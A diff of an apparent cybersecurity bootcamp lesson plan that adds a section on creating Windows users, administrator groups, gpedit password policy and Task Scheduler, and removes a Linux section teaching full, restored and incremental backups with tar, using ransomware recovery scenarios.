+### 13. Instructor Do: Creating Users and Setting Password Policy (0:10)
+
+In this section, we will be covering another common sysadmin responsibility: setting user password policies. 
+
+This section builds off of the prevous utilities such as `net user` and `net localgroup`.
+
+We covered the importance of password policies in the previous Linux units. Now we'll demonstrate applying similar concepts in Windows:
+
+- We will be creating a new administrator and regular user on this machine. 
+
+- Then, we will set a password policy to ensure these users' passwords adhere to company-wide password policies.
+
+  - As we saw at the end of the previous activity, there wasn't a **minimum password length** set. Every organization should have a minimum password length policy. We'll look at how to do that with the `gpedit` tool.
+
+We'll use the `net user` utility to create Windows user accounts for the next two new users: senior developer `Andrea`, and sales representative `Barbara`.
+
+For the next activity we are going to learn to do the following:
+
+- Create a regular user, `Barbara`.
+
+- Create an administrator user, `Andrea`.
+
+- Change user groups with `net localgroup`.
+
+- Set workstation password policies with `gpedit`.
+
+#### Creating a Regular User
+
+In the previous activity, we used the command `net user` to show a list of all users on the system and then appended the results to our report.
+
+Now we will use the `net user` utility again, adding a username after `net user`, and forward-slash-add (`/add`), so that our new command looks like: `net user [username] /add`.
+
+- We can also specify a password for the user by typing a password after the username, with the following syntax: `net user [username] [password] /add`.
+
+To combine those steps and add a user named `Barbara` with the password `Coldcalls123!`, we use `net user Barbara Coldcalls123! /add`.
+
+- Run `net user Barbara Coldcalls123! /add`. If successful, we'll get the following output:
+
+  ```console
+  The command completed successfully.
+  ```
+  Now a regular user, `Barbara`, exists.
+
+#### Creating an Administrative User with Elevated Privileges
+
+Now we'll be creating a new user account for the new Windows senior developer, `Andrea`, and adding it to the `Administrators` group.
+
+Start by running the same command for creating a new user. You will use the name `Andrea` instead of `Bob`:
+
+- Run `net user Andrea JavaMaster123! /add` and note the output:
+
+  ```console
+  The password entered is longer than 14 characters.  Computers
+  with Windows prior to Windows 2000 will not be able to use
+  this account. Do you want to continue this operation? (Y/N) [Y]: y
+  The command completed successfully.
+  ```
+
+- Note that Windows versions prior to `Windows 2000` could not support passwords longer than 14 characters. Press `Y`.
+
+After creating the user, `Andrea`, we can use the `net localgroup` command-line utility to add `Andrea` to the `Administrators` local group. This will allow Andrea to manage the Windows workstation as a super user.
+
+Add Andrea to the `administrators` group:
+
+- Run `net localgroup Aministrators Andrea /add` and then note the output:
+
+  ```console
+  The command completed successfully.
+  ```
+
+We can use the `net user` command, as in the previous activity, to check the user's account parameters:
+
+- Run `net user Andrea`. Note the `*Administrators` group at bottom of the output:
+
+  ```console
+  ...[results truncated]
+  Local Group Memberships      *Administrators       *Users
+  Global Group memberships     *None
+  The command completed successfully.
+  ```
+
+We've now successfully created a new user and added them to the `Administrators` localgroup.
+
+#### Setting the Windows Workstation's Password Policy
+
+Now that we have our users, we want to define and enforce a strong password policy for this Windows computer.
+
+We will be using the GUI tool `gpedit` to set password policies with the following parameters:
+
+- Maximum password age to `60` days.
+
+- Minimum password length to `8` characters.
+
+- Password complexity requirements to be enabled.
+
+Run `gpedit` and navigate to `Windows Settings` > `Security Settings` > `Account Policies` > `Password Policy`, and set the following:
+
+- Set `Maximum password age` to `60` days. While `Maximum password age` is highlighted, right-click it, and click on `Properties` to see the tabs for enabling and disabling the option. You can also go to the `Explain` tab to see what best practices exist for password expiration policies.
+
+  ![Password Policy Properties Example](./Images/password_policy_properties_example.PNG)
+
+- Set `Minimum password length` to `8 characters`
+
+- And lastly, double-click on `Password must meet complexity requirements`, and set to `Enabled`. Select `Apply`, then click on the `Explain` tab and read the following:
+
+  ```console
+  Password must meet complexity requirements
+
+  This security setting determines whether passwords must meet complexity requirements.
+
+  If this policy is enabled, passwords must meet the following minimum requirements:
+
+  Not contain the user's account name or parts of the user's full name that exceed two consecutive characters
+  Be at least six characters in length
+  Contain characters from three of the following four categories:
+  English uppercase characters (A through Z)
+  English lowercase characters (a through z)
+  Base 10 digits (0 through 9)
+  Non-alphabetic characters (for example, !, $, #, %)
+  Complexity requirements are enforced when passwords are changed or created.
+  ```
+
+### 14.  Create User and Set Password Policy Activity (0:10)
+
+- [Activity File: Creating Users and Setting Password Policies](Activities/14_Create_User_Password_Policy/Unsolved/readme.md)
+
+### 15.  Creating Users and Setting Password Policy Review (0:05)
+
+- [Solution Guide: Creating Users and Setting Password Policies](Activities/14_Create_User_Password_Policy/Solved/readme.md)
+
+
+### 16. Task Scheduling 
+
+In the final section of this lesson, we will use the administrative user, `Andrew`, to create scheduled tasks that will automate the reports we've been working on. 
+
+Task Scheduler is a GUI tool that allows system administrators to automate the execution of scripts and applications on a Windows system. 
+
+- These are similar to cron jobs in Linux in that they can be set to execute at specific times or after a certain amount of time once a user logs in. 
+
+- It is  important to properly manage systems with scheduled tasks to automate security and system administration actions such as: checking for updates for endpoint security software, sending important logs to systems such as SIEMs (Security Information and Event Management), or scheduling system maintenance scripts.
+
+#### Task Scheduling Demo
+
+- Your CIO wants to schedule reports to be created on a daily basis.  This system isn't remotely managed at the moment, and with a new developer coming in, huge changes might be made to the machine's configuration. 
+
+- This will help reduce workstation development drift for any new users for the Windows environment, and for this specific developer position and project.
+
+- Your CIO has asked you to use the GUI tool Task Scheduler to create a task that will run each day.
+
+
+[Activity File: Task Scheduling ](Activities/18_Scheduling_Tasks/Unsolved/readme.md)
+
+[Solution Guide: Task Scheduling](Activities/18_Scheduling_Tasks/Unsolved/readme.md)
 
 ----
 
-### 01. Welcome and Overview  
-
-Welcome to the second week of Linux. In the previous unit, we learned about system configuration, file structures, and hardening against attacks.
-
-In this unit, we continue to explore how system administrators use Linux tools to secure a system by:
-
-- **Archiving** data to ensure it remains availabile in case of a natural disaster or cyber attack.
-
-- **Scheduling** backups to ensure they are up to date and made monthly, hourly, or daily.
-
-- **Monitoring** log files to prevent and detect malicious activity and keep systems running efficiently.
-
-System administrators use archiving, scheduling, and monitoring for the following tasks:
-
-- Overseeing or conducting backup and recovery.
-
-- Determining how long to retain (keep) data and the frequency at which (how often) it is backed up.
-
-- Ensuring files are backed up and restored correctly.
-
-- Providing security to ensure that compliance requirements are met.
-
-#### Today: Archiving with `tar`
-
-Today we focus on creating and managing archives using the `tar` utility.
-
-- These skill are essential to ensuring the availability of a system and its data.
-
-_Backups_ and _data archiving_ are important to maintain compliance with regulations for IT security in industries such as finance and health:
-
-- In finance, the common standard for data archiving is the **Sarbanes-Oxley Act** (SOX), which requires all business records and communication to be retained for five years.  
-
-- The **Markets in Financial Instruments Directive** (MiFID II) requires the European Union's financial firms to retain and reproduce records of all activity from telephone conversations and electronic communications, including instant messages and social media interactions.
-
-* In health, the most common standard is  **Health Insurance Portability and Accountability Act** (HIPAA), which requires that healthcare providers keep records for six years.
-
-*Note:* For additional information on the above laws:
-
-* [Sarbanes-Oxley Act (SOX)](<https://www.mythics.com/about/blog/sarbanes-oxley-act-sox-compliance-requirements-for-it-security>)
-* [Health Insurance Portability and Accountability Act (HIPPA)](<https://linfordco.com/blog/hipaas-record-retention-requirements/>)
-*  [Markets in Financial Instruments Directive 2004/39/EC (MiFID II)](<https://www.mirrorweb.com/mifid-ii-compliance>)
-
-
-### 02. An Introduction to using the `tar` Command
-
-Cybersecurity professionals ensure that systems are protected from data loss and interruptions caused by attacks or natural disasters.
-
-The following are examples of data loss:
-
-- In 2019, hackers seized important government machines in [Baltimore, Maryland](<https://www.nytimes.com/2019/05/22/us/baltimore-ransomware.html>) during a ransomware attack.
-
-- In 2019, Hurricane Michael caused massive flooding, destroying hundreds of homes, businesses, and strategic defense data at [Tyndall Air Force Base](<https://www.washingtonpost.com/national/hurricane-michael-tyndall-air-force-base-was-in-the-eye-of-the-storm-and-almost-every-structure-was-damaged/2018/10/23/26eca0b0-d6cb-11e8-aeb7-ddcad4a0a54e_story.html?utm_term=.9182d43bfb6f>).
-
-System administrators **back up** their systems to ensure quick recovery of functionality and restoration of any lost data.
-
-- A **backup** is a **saved version** of all the files in a hard drive at a given point in time.
-
-- A **backup** is ideally saved to a remote location, so that in the event of compromise, those files can be restored to minimize downtime.
-
-- Backups are generally done hourly or daily to ensure that they contain current versions the data.
-
-- Performing regular backups should be one of a system administrator's top priorities.
-
-In addition to a full backup, which saves every file in the system, administrators can also create backups of individual files and folders. This is useful when you don't need to backup the entire system.
-
-- For example, an administrator may create a backup containing only the `/home` directory, ensuring that users will always have access to their data, even if the rest of the machine is compromised.
-
-There are different types of backups, known as backup **levels**: full, incremental, and differential.
-
-
-A **full backup** creates a backup of the entire system.
-
-- You would create a full backup if, for instance, you recently got a new computer for work and wanted to do an initial backup.
-
-- Full backups allow for a more reliable restoration of a system. They also provide better storage management, as all the files are in one place.
-
-- However, full backups are slow and require a lot of storage space.
-
-In addition to a full backup, administrators can create **backups of individual files and folders**.
-
-- For example, an administrator can create a backup containing only the `/home` directory, ensuring that users will not lose their individual data, even if the rest of the machine is compromised.
-
-
--  **Incremental** and **differential** backups archive *only data that has changed* since the last backup. They are fast and take up less disk space, but require all previous backups in order to be fully restored.    
-
-
-Why backup levels are important:
-
-* When a system is compromised, users may have to delete the entire operating system and install it from scratch. This is time-consuming and costly for enterprise-level networks.
-
-* Rather than delete and reinstall the entire operating system, you will be able to restore the computer back to the state it was in according to the backup image used to restore the computer.
-
-#### Performing a Backup
-
-Now that we understand the importance of backups, we’ll discuss how to actually perform one.     
-
-The `tar` command is a Linux utility that is used to create backups.
-- Note: `tar` is a powerful tool that can do more than just create simple backups, as we'll see later.
-
-- `tar` stands for _tape archive_.
-
-
-- `tar` is used to create an **archive** of the files we want to back up.
-
-
-Note the following about archives:
-
-- An archive is a collection of files and directories.
-
-- A backup is an archive used specifically to preserve information in the event of data loss.
-
-- Archives created by `tar` are called **tarballs** and use the extension `.tar`.
-
-- The file size of a tarball is equal to the sum of the file sizes of each of the all files it contains. This is important, because it means that a full backup created by `tar` takes up the same amount of space as all the files in the system.
-
-
- **Compression** uses mathematical algorithms to reduce the size of file(s) by converting them to a different format which takes up less space than the original file(s).
-
-
-* There are many different ways to compress a file. The most common for systems administrators are `gzip` and `bzip2`.
-
-* `gzip` is the accepted standard for compression on Unix-like systems. `bzip2` offers better compression, but is much slower than `gzip`.
-
-* Both `gzip` and `bzip2` are commands that can be used to compress any file, but `tar` has built-in flags that allow you to compress tarballs immediately.
-
-* Tarballs that have been gzipped have the extension `tgz` or `tar.gz`, and the extension `bz2` if they've been bzipped.
-
-#### Creating an Archive
-
-Next, we cover how to “create” an archive.    
-
-The Systems Operations Center at [Tyndall Air Force Base](<https://www.washingtonpost.com/national/hurricane-michael-tyndall-air-force-base-was-in-the-eye-of-the-storm-and-almost-every-structure-was-damaged/2018/10/23/26eca0b0-d6cb-11e8-aeb7-ddcad4a0a54e_story.html?utm_term=.9182d43bfb6f>) likely backed up all system data with the approaching threat of Hurricane Michael.
-
-They would create a full backup of all the log files in `/var/log` directory using the `tar` command as follows:
-
-
-- `sudo tar cvf hurricane-backup-10-11-2018.tar /var/log`
-
-    Syntax breakdown:
-
-    `tar [option(s)] [archive_name] [objects_to_archive]`
-    
-    -  `sudo` point out that because `/var/log` contains system files, we need root privileges in order to access them. It would compromise our security if all users were able to make backups of our system files. 
-    - `tar` is the Linux command. We always begin our backups with `tar`.
-    - `c` , `v`, and `f` are [_short_](<http://linuxcommand.org/lc3_man_pages/tar1.html>) form options.
-    - `c` stands for create. We use this option when creating an archive.
-    - `v` stands for [_verbose_](<https://www.gnu.org/software/tar/manual/html_node/verbose-tutorial.html>). This option displays the file path and name of each file as it's archived.
-    -note: We can also use `vv`, for "very verbose".  This option not only displays the file name and path, but also the permissions, owner, group, size, creation date and time of each file as it's added to the archive.
-    We cover verbose output in greater detail below.
-    - `f` stands for [_use this archive file_](<https://www.gnu.org/software/tar/manual/html_node/file-tutorial.html#SEC14>). It is followed by the title of the archive. It can also be written as `--file=archive_name`.  This option must be present when creating an archive.
-    - `hurricane-backup-10-11-2018.tar` is the `archive_name` and indicates the title given to our archive. Note the `.tar` file extension.
-    - `var/log` are the _objects to archive_, indicating the files or directories we want to back up.
-
-
-If `tar` does not receive files or directories to archive, it outputs the following error message:
-
-```
-tar: Cowardly refusing to create an empty archive
-Try 'tar --help' or 'tar --usage' for more information
-```
-
-**Verbosely verbose is very virtuous!**
-Running tar verbosely is not only helpful, it's considered best practice!  For example, we can use the `-vv` option and redirect the output of `tar` to a logfile.  That way we can go back and see details about every file that was archived.
-
-Run the following commands:
-
-- `sudo tar cf 2018-10-12-hurricane-backup.tar /var/log`
-
-Notice that there is no output.  
-
-
-Next, run this command with the `v` option and see the following output.
-
-- `sudo tar cvf 2018-10-12-hurricane-backup.tar /var/log`
-
-    ```
-    /var/log/fontconfig.log
-    /var/log/kern.log.2.gz
-    /var/log/wtmp
-    /var/log/vboxadd-install.log
-    ...
-    ...
-    ```
-
-This command _shows the file paths and names_ that are being written to the archive as the command runs. However, it does not display a _full listing_.
-
-Run the command using the `vv` option and see the following output:
-
-- `sudo tar cvvf 2018-10-12-hurricane-backup.tar /var/log`
-
-    ```
-    -rw-r--r--  root/root      5784  2019-07-03  15:38   /var/log/fontconfig.log
-    -rw-r-----  syslog/adm   141571  2019-07-1-  11:16   /var/log/kern.log.2.gz
-    -rw-rw-r--  root/utmp     20352  2019-07-15  15:33   /var/log/wtmp
-    -rw-r--r--  root/root       695  2019-07-05  21:09   /var/log/vboxadd-install.log
-    ```
-
-This information is important to determine which archive to use when restoring data after an attack.
-
-As mentioned above, the verbose output of a `tar` command can also be written to a file for later review.  
-
-- How this would be accomplished?
-
-    - `>`  will redirect output to a file.
-
-Some of the best practices for maintaining [security](<https://www.gnu.org/software/tar/manual/html_section/tar_84.html#SEC176>) such as, Confidentiality, Integrity, and Availability or the CIA triad when creating an archive include:
-
-- Be sure archives are not writable by an untrusted user.
-
-- Inspect all data, such as passwords, before writing to an archive, so that we don't unknowingly archive sensitive information.
-
-- Monitor all backups, as `tar` is vulnerable to denial of service (DoS) attacks, which can be triggered if an attacker creates an infinitely deep directory hierarchy.
-
-- Pay attention to the diagnostic and exit status of `tar`.
-
-### 03. Activity: Creating a Backup using the `tar` Command
-
-- [Activity File: Creating a Full Backup using `tar`](Activities/03_Creating_Full_Backups/Unsolved/README.md)
-
-
-### 04. Activity Review: Creating a Full Backup Using `tar`
-
-- [Solution Guide: Creating a Full Backup using `tar`](Activities/03_Creating_Full_Backups/Solved/README.md)
-
-
-
-### 05. Restoring Data with `tar`
-
-We've covered how to use `tar` to create full backups. Now, we'll show how to restore data from a full backup.
-
-Consider a scenario in which your laptop is stolen.  
-
-- After buying a replacement laptop, you want to put all the files that were on your first laptop onto your new one.
-
-- Fortunately, you had a full backup of all your files on an external hard drive, so you can access everything that was lost.
-
-Restoring data from a backup usually includes the following steps:
-
-- Listing the contents of your backup to ensure that it has the data you want to restore.
-
-- Extracting the files, which will copy and restore them to disk.
-
-To use the `tar` command to put all the files in the full backup on your new laptop:
-
-- `tar xvvf my_laptop_backup.tar`
-
-    Syntax breakdown:
-
-    - `x` means _extract_ the files from the archive and write to disk.
-    - `vv` file name, path, permissions, owner, group, size, and date/time of creation
-    - `f` specifies the archive file to use.
-
-    - `my_laptop_backup.tar` is the archive that contains the files from your laptop.
-
-The command used to extract files from an archive is almost identical to the command used to create one. The only difference is the replacement of **`c`** with **`x`**.    
-
-After running this command, all of your emails, documents, pictures, movies (_every_ file)  contained in `my_laptop_backup.tar` will be extracted from the archive and saved to the new laptop's hard drive. This process is called **backup restoration**.    
-
-Before extracting, you would first list the contents of the archive to ensure it has the data you want, and no data that you don't want.
-
-- Listing files in an archive does _not_ restore the data. The contents of the archive are only displayed on a terminal screen.
-
-- Extraction _copies_ and _restores_ the files to disk.
-
-We don't always need to restore the full contents of a backup. In those cases, we use `tar` to first list the contents of our backup, and then we can extract only the specific data we need.
-
-#### Medical Center Scenario
-
-Now, we will cover how to use this method of restoring files to protect organizations in the aftermath of a cyberattack.
-
-
-Medical centers and hospitals are large targets for cybercriminals. In 2019 [Hackensack Meridian Health's systems](https://www.app.com/story/news/health/2019/12/13/hackensack-meridian-ransom-hackers-cyber-attack-hospitals/2638701001/) were compromised by a ransomware attack. Attackers encrypted medical data of many patients in the hospital.
-
-- The attackers offered to decrypt the data in exchange for payment, effectively ransoming the government's data. Unfortunately, in the case of Hackensack, the hospital had to pay.
-
-In the following demonstration, we are going to do what the hospital should have done in preparation for potential cyber attacks.
-
-
-For this demonstration, we'll respond to a ransomware attack that hit a hospital on the morning of May 11 2019. Among the affected systems were:
-
-- Doctors
-- Patients
-- Treatments
-- Files
-
-After taking the infected systems offline, we'll need to:   
-
-- Restore the operating system and applications using the full backup.
-- Restore email data using the full backup.
-
-To restore the email data, the SysOps team will use the `tar` command to:
-
-- _List_ the contents of the latest full backup and locate the email data.
-- _Extract_ the email data from the archive to a directory on the new system.
-
-#### Hospital Walkthrough
-
-Open a terminal window. We'll now look at the directory that contains the `tar` file of the hospital's latest full backup.
-
-- Run `cd ~/Documents/epscript/treatments/backup/`
-
-- Run `ls -l 10May2019-235536-0700.tar`
-
-The date and time on the archive indicate that this backup was created the night before the attack.
-
-Run the following command to list the files in the archive and see the output below:
-
-- tar tvvf 10May2019-135536-0700.tar | less
-
-    ```
-    drwxr-xr-x root/root         0 2019-05-09 17:29 16:29 backups/
-    drwxr-xr-x root/root         0 2019-05-09 17:29 backups/neurology/
-    -rwxr-xr-x root/root      9465 2019-05-09 17:29 backups/neurology/treatments.18.csv
-    -rwxr-xr-x root/root      9761 2019-05-09 17:29 backups/neurology/treatments.16.csv        
-    ...
-    ...
-    drwxr-xr-x root/root         0 2019-05-09 17:29 backups/oncology/
-    -rwxr-xr-x root/root      9354 2019-05-09 17:29 backups/oncology/treatments.12.csv
-    -rwxr-xr-x root/root      9070 2019-05-09 17:29 backups/oncology/treatments.8.csv
-    ...
-    ...
-    drwxr-xr-x root/root         0 2019-05-09 17:29 backups/cardiology/
-    -rwxr-xr-x root/root      9477 2019-05-09 17:29 backups/cardiology/treatments.5.csv
-    -rwxr-xr-x root/root      9952 2019-05-09 17:29 backups/cardiology/treatments.7.csv
-    ...
-    ...
-
-   ```
-Syntax breakdown:
-
-- `t` is an option that lists the contents of an archive.
-- `vv` is used to display all relevant file information.
-- `f` is used to specify the archive file to use.
-- `10May2019-235536-0700.tar` is the archive name.
-- `| less` means we will pipe the output to `less`, so that we can scroll through the output.
-
-If `tar` cannot find the archive or file to list, it will output the following message:
-
-```
-tar: <archive>: Not found
-tar: Exiting with failure due to previous errors
-```
-
-Next, we will extract the email files from the archive and place them in a new directory.  
-
-First we need to create a new directory to hold the restored email files.
-
-- Run `mkdir restored_emails`
-
-Now we'll extract the email files from the archive:
-
-- Run:  `tar xvvf 10May2019-235536-0700.tar -R -C restored_emails --wildcards "*.csv"`   
-
-Syntax breakdown:
-
-- `x` means to extract and write the files to disk.
-- `vv` is used to display the full file specification.
-- `f` is used to specify the archive file to use.
-- `10May2019-235536-0700.tar` is the archive file.
-- The `-R` option tells `tar`to print error messages for any errors with the block number in the archive file when extracting files.  
-    - We should always use the `R` option while extracting data to verify that there are no file errors.
-- `-C restored_emails` is the name of the directory where the `.csv` files will be placed.
-- `--wildcards "*.csv"`is used to only extract the files with the extension **`.csv`**.
-
-- After running that command, you should see the following at the end of your output:
-
-    ```
-    block 1576: ** Block of NULs **
-    ```
-   - **Block of Nul** means that data failed to be read in that block (or range of blocks)is replaced by NULs, so that the length of the data is preserved even if the actual data is lost (since it's not possible to read it).
-
-Run the following command to show the restored emails:
-
-- `ls -l restored_emails/backup/neurology/`
-
-The original directory structure (`backup/neurology`) is retained in the archive and now can be seen on disk.  
-
-* We should always use the -t option to list an archive's contents before extracting, to avoid unwanted results.  If we extract the wrong archive, for example, we could end up with files and folders being overwritten and out of place.
-
-* Note the following:
-
-    * Files archived with leading (`/`) slash will be *restored to their absolute locations*.
-
-    * Files that were archived without leading (`/`) slashes will be restored *under the current directory*.
-
-    * Files extracted from an untrusted archive should be extracted into an *empty directory*.
-
-
-### 06. Activity: Restoring Data with `tar`
-
-- [Activity File: Restoring Data](Activities/06_Restoring_Data/Unsolved/README.md)
-
-
-### 07. Activity Review: Restoring Data with `tar`
-
-- [Solution Guide: Restoring Data](Activities/06_Restoring_Data/Solved/README.md)
-
-### 08. Incremental Backups with `tar`
-
-So far, we've been creating _full backups_.
-
-While full backups ensure the availability and integrity of a system, there are some drawbacks to using them.
-
-* The file size of a full backup is large, as it is an archive of the entire system.
-
-* Depending on the size of the file system, doing a full backup can take a long time.
-
-This is where **incremental backups** are helpful.
-
-* Incremental backups are done after a full backup has been performed on a system.
-
-* Incremental backups capture only what has changed since the last incremental backup. This makes incremental backups smaller than full backups.
-
-Incremental backups track all changes in a special file called a **snapshot file**.
-
-
-* The snapshot file is created when the administrator creates the initial, or **level 0** incremental backup. The snapshot file is automatically updated after each subsequent incremental backup, to track any changes to the file system.  If files are created, deleted, or modified between incremental backups, the snapshot file tracks those modifications.
-
-
-- The snapshot tracks all changes made to files that are in the backup.
-
-- The snapshot tracks all changes made since the last backup.
-
-* Consider the frequency of incremental backups (e.g., hourly or daily). Making incremental backups hourly ensures that each backup is small and restores (relatively) quickly, with minimum loss of data after an attack.
-
-
-Incremental backups have benefits and drawbacks:
-
-* Restoring is slower because you must restore the latest full backup, and then each incremental backup.
-
-- Disadvantages to using Incremental backups:
-
-
-* There may be loss of data if one of the backups is corrupted. For example, if we cannot read the backup done at a certain time or on a certain day, then the entire backup will fail.
-
-* This is why it's so important to verify that an archive is created with no errors by using the `tar` `W` option.
-
-
-#### Creating the Incremental Backup
-
-Note how tar is used to create incremental backups:
-
-* An [incremental backup](<https://www.gnu.org/software/tar/manual/html_node/Incremental-Dumps.html>) is a special form of a `tar` archive.  
-
-* `tar` stores additional metadata or information so that the exact state of the file system can be restored when extracting the archive.
-
-* The additional information includes which files have been modified, created, or deleted since the last backup, so that the next incremental backup will contain _only modified_ files.
-
-* The additional information is stored in a snapshot file.
-
-     * Snapshot files have the extension .`snar`, which stands for *sn*apshot + t*ar*.
-
-        * For example: `emerg_backup.snar`
-
-      A snapshot file called `emerg_backup.snar` will be used to store the additional information, such as, which files have been changed, added, or deleted. This file is in binary format and is not human-readable.
-
-
-Next, we will create an incremental backup with the `tar` command.       
-
-- Type the following command and note that this requires two new flags in addition to the ones you are already familiar with:
-
-    - `$ tar cvvWf emerg_back_sun.tar --listed-incremental=emerg_backup.snar --level=0 emergency`
-
-Syntax breakdown:
-
-* `--listed-incremental=emerg_backup.snar`: This option tells `tar` that this backup will be part of a series of incremental backups, and specifies that information about files that are created, modified, or removed should be stored in a snapshot file called `emerg_backup.snar`.
-
-- `--level=0`: Each incremental backup has a level. We use level 0 to indicate the first, or full backup. The next incremental backup will be level 1, and then level 2, and so forth.
-
-Because this is the first backup in the series, this is both a full backup and an incremental backup. This is because the first backup in a series of incremental backups is necessarily a full or **level 0** backup.
-- The following incremental backup(s) will be smaller in size.
-
-- When this backup is created, the snapshot file will simply contain `Y` for every file in the archive.
-
--Note:  The option `--level=0` has a `--` before it and uses the full word "level".  This is called the [long form](<http://linuxcommand.org/lc3_man_pages/tar1.html>). Incremental commands typically use this syntax.
-
-#### Incremental Backups Demo Setup
-
-Use the following scenario as the basis for this demonstration of incremental backups:
-
-* A hospital's system operations staff performs a full backup of all the data in the emergency database on Sunday.
-
-* On Monday, the staff runs an incremental backup which stores all changes made on Monday. This backup is smaller than the full backup.
-
-* On Tuesday, an incremental backup archives only the changes made on Tuesday to the emergency database.
-
-* The hospital is hit with a ransomware attack on Wednesday and all the data in the emergency database is encrypted.
-
-* Fortunately, since the hospital created full and incremental backups, the files in the emergency database are easy to restore.
-
-
-You'll use the `tar` command to complete the following steps:
-
-* _Create_ a full or level 0 backup of the emergency directory and a snapshot file.
-
-* _Display_ the contents of the level 0 backup that would have been created on Sunday.
-
-* _Create_ the incremental backups that would have been generated on Monday and Tuesday.
-
-* _Remove_ the emergency directory to mimic the ransomware attack on Wednesday.
-
-- Note: We can just rename it, instead of removing it.  That way we can repeat the demo.
-
-* Finally, _restore_ the emergency directory by first restoring the full backup taken on Sunday, restoring the incremental backup taken on Monday, and lastly restoring the second incremental backup taken on Tuesday.  
-
-#### Incremental Back Up Demo
-
-
-We'll start in our `$`$HOME/Documents/epscript` directory` and list the contents of the simulated emergency directory for the hospital.  Two directories are located there: `admit` and `discharge`.
-
-
-- Run `ls -l emergency`
-    ```
-    drwxr-xr-x  2   instructor  instructor  4096    Jul 4   03:28   admit
-    drwxr-xr-x  2   instructor  instructor  4096    Jul 3   22:34   discharge
-    ```
-
-Next, we'll list the contents of the `admit` and `discharge` directories and show the output.
-
-- Run ` ls -l admit discharge`
-
-    ```
-        admit:
-        total 16
-        -rw-r--r--  1   instructor  instructor  20  Jul 3   22:34   file1
-        -rw-r--r--  1   instructor  instructor   9  Jul 4   02:55   file3
-        -rw-r--r--  1   instructor  instructor  13  Jul 4   03:26   file4
-        -rw-r--r--  1   instructor  instructor  13  Jul 3   03:28   file5
-       
-        discharge:
-        total 4
-        -rw-r--r--  1   instructor  instructor  19  Jul 3   22:34   file2
-    ```
-
-
-Again, the syntax for the command is:
-
-- `tar [options] [archive_name] --incremental=[snapshot file name] --level=0 [objects_to_archive]`  
-
-We will now run  the following command to simulate the level 0 backup on Sunday.  
-
-- Run `cd ..` to return to the `epscript` directory.
-
-- Run: `tar cvvWf emerg_back_sun.tar --listed-incremental=emerg_backup.snar --level=0 emergency`
-
-
-This command will create the following:
-
-- A level 0 or full backup in the file `emerg_back_sun.tar`.
-
-- A snapshot file called `emerg_backup.snar` that will be used to store the additional information such as which files have been changed, added, or deleted.  This file is in binary format and is not human-readable.
-
-- `tar` indicates this information by appending data to the archive as follows:
-
-    - `Y` indicates that the file is contained in the archive.
-
-    - `N` indicates that the file was present in the directory at the time the archive was made, yet it was not added to the archive because it has not changed since the last backup.
-
-    - `D` indicates the file is a directory.  
-
-Other options we have used so far:
-
-- `c` creates an archive.
-
-- `vv` or “very verbose” displays all relevant information for each file as it is archived.
-
-- `W` verifies the archive after creating it. You used this option when creating a full backup. It should _always_ be used.
-
-- `f` stands for _use this archive file_.  This option must be present.
-
-- `emerg_back_sun.tar` is the archive filename.  This is the full backup that is completed every Sunday.
-
--  `emergency` is the directory we want to backup.
-
-Next, we will show the files that were created from the command.   
-
-- Run the `ls command` on the `epscript` directory:
-
-    `ls -l epscript`
-
-The output:
-
-```
-emerg_back_sun.tar - this is the `full` or `level 0` backup file
-
-emerg_backup.snar - this is the `snapshot` file
-```
-
-
-
-It is best practice to use the `tar` list command to check the archive after creating it.
-
-
-- Run the following command from inside the `escript` directory:
-
-     - `tar tvvf emerg_back_sun.tar --incremental`
-
-    - Your output might differ slightly from what's shown in the image below.
-
-
-    ```
-    drwxr-xr-x instructor/instructor        45 2019-12-28 17:30 emergency/admit/
-    Y file1.txt
-    Y file2.txt
-    Y file3.txt
-    Y file4.txt
-
-    drwxr-xr-x instructor/instructor        12 2019-12-28 17:35 emergency/discharge/
-    Y file2.txt
-
-    -rwxr-xr-x instructor/instructor     10244 2019-12-28 17:35 emergency/.DS_Store
-    -rwxr-xr-x instructor/instructor         0 2019-12-20 13:05 emergency/.gitkeep
-    -rw-r--r-- instructor/instructor     10240 2019-12-28 17:37 emergency/emerg_back_sun.tar
-    -rw-r--r-- instructor/instructor        36 2019-12-28 17:37 emergency/emerg_backup.snar
-    -rw-r--r-- instructor/instructor         0 2019-12-28 17:35 emergency/
-    -rwxr-xr-x instructor/instructor       689 2019-12-28 17:30 emergency/admit/file1.txt
-    -rwxr-xr-x instructor/instructor       341 2019-12-28 17:30 emergency/admit/file2.txt
-    -rwxr-xr-x instructor/instructor       661 2019-12-28 17:30 emergency/admit/file3.txt
-    -rwxr-xr-x instructor/instructor       840 2019-12-28 17:30 emergency/admit/file4.txt
-    -rwxr-xr-x instructor/instructor       341 2019-12-28 17:35 emergency/discharge/file2.txt
-
-
-    drwxr-xr-x instructor/instructor        12 2019-12-28 17:35 emergency/discharge/
-    Y file2.txt
-
-    -rwxr-xr-x instructor/instructor     10244 2019-12-28 17:35 emergency/.DS_Store
-    -rwxr-xr-x instructor/instructor         0 2019-12-20 13:05 emergency/.gitkeep
-    -rw-r--r-- instructor/instructor     10240 2019-12-28 17:37 emergency/emerg_back_sun.tar
-    -rw-r--r-- instructor/instructor        36 2019-12-28 17:37 emergency/emerg_backup.snar
-    -rw-r--r-- instructor/instructor         0 2019-12-28 17:35 emergency/
-    -rwxr-xr-x instructor/instructor       689 2019-12-28 17:30 emergency/admit/file1.txt
-    -rwxr-xr-x instructor/instructor       341 2019-12-28 17:30 emergency/admit/file2.txt
-    -rwxr-xr-x instructor/instructor       661 2019-12-28 17:30 emergency/admit/file3.txt
-    -rwxr-xr-x instructor/instructor       840 2019-12-28 17:30 emergency/admit/file4.txt
-    -rwxr-xr-x instructor/instructor       341 2019-12-28 17:35 emergency/discharge/file2.txt
-    ```
-
-- Note that this command lists (as indicated by the t option) the files in each of the incremental backups, and the times that they were last modified.
-
-    Syntax breakdown:
-
-    - `t` lists the files from the archive to the terminal screen.
-    - `vv` displays all relevant file information.
-    - `f` stands for _use this archive file_.  This option must be present.
-    - `emerg_back_sun.tar` is the archive to use.
-    - `--incremental` indicates that this is an incremental backup.
-
-Using the `--incremental` option will display one of the following next to each file:
-
-- `Y` indicates that the file is contained in the `emerg_back_sun.tar` archive.
-
-- `N` indicates that the file was present in the directory at the time the archive was made, but was not added to the `emerg_back_sun.tar` archive because it has not changed since the last backup.
-
-- `D` indicates the file is a directory.
-
-Now we will simulate the Monday and Tuesday incremental backups that were run by the system admin team.
-
-- First, we will simulate the addition of a new file to the `admit` directory. This change was made on Monday, the day after the level 0 backup was created.
-
-- Run the commands to _create_ the Monday incremental backup, _list_ the contents, and _show_ the output from the command with the added file.ad
-
